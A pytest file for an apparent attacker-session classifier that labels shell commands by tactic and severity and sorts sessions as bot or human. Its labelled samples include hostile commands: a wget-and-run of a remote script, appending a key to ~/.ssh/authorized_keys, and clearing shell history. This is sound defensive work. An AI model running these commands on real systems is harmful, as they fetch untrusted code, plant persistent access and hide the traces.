from datetime import datetime

import pytest
from sklearn.ensemble import RandomForestClassifier

from vulnmaze.classify.session import fit, predict
from vulnmaze.classify.tier import FEATURES, session_features

LINES = [
    ("uname -a", "Discovery", "R1"),
    ("cat /proc/cpuinfo", "Discovery", "R0"),
    ("wget http://x/a.sh; sh a.sh", "Execution", "R4"),
    ("echo key >> ~/.ssh/authorized_keys", "Persistence", "R3"),
    ("history -c", "Stealth", "R3"),
]
MODELS = fit([{"input": x, "tactic": t, "severity": s} for x, t, s in LINES])


def _tier_model():
    """A tier model that answers bot for fast sessions and human for slow ones."""
    fast = [(f"2025-07-01T00:00:0{i}+00:00", "uname -a") for i in range(3)]
    slow = [(f"2025-07-01T00:0{i}:00+00:00", "uname -a") for i in range(3)]
    rows = [session_features([(datetime.fromisoformat(t), x) for t, x in s]) for s in (fast, slow)]
    model = RandomForestClassifier(n_estimators=5, random_state=29).fit([[r[f] for f in FEATURES] for r in rows], ["bot", "human"])
    return {"features": list(FEATURES), "model": model}


@pytest.mark.parametrize(
    "commands, severities, session_max, session_high, tier",
    [
        ([{"ts": "2025-07-01T00:00:00+00:00", "input": "uname -a"}], ["R1"], "R1", 0, None),
        (
            [
                {"ts": "2025-07-01T00:00:00+00:00", "input": "uname -a"},
                {"ts": "2025-07-01T00:00:01+00:00", "input": "secret", "realm": "passwd"},
                {"ts": "2025-07-01T00:00:01+00:00", "input": "wget http://x/a.sh; sh a.sh"},
                {"ts": "2025-07-01T00:00:02+00:00", "input": "history -c"},
            ],
            ["R1", "R4", "R3"],
            "R4",
            2,
            "bot",
        ),
    ],
)
def test_session_gets_per_command_labels_running_severity_and_tier(commands, severities, session_max, session_high, tier):
    """Each command gets its tactic and severity, the running severity only rises, lines typed into a program are skipped."""
    result = predict({**MODELS, "tier": _tier_model()}, commands)
    assert [c["severity"] for c in result["commands"]] == severities
    assert [c["session_max"] for c in result["commands"]] == sorted(c["session_max"] for c in result["commands"])
    assert (result["session_max"], result["session_high"], result["tier"]) == (session_max, session_high, tier)


@pytest.mark.parametrize(
    "commands",
    [[], [{"ts": "2025-07-01T00:00:00+00:00", "input": "   "}], [{"ts": "2025-07-01T00:00:00+00:00", "input": "x", "realm": "cat"}]],
)
def test_session_without_commands_is_rejected(commands):
    """A session with no commands left after skipping blank lines and program input raises."""
    with pytest.raises(ValueError):
        predict(MODELS, commands)
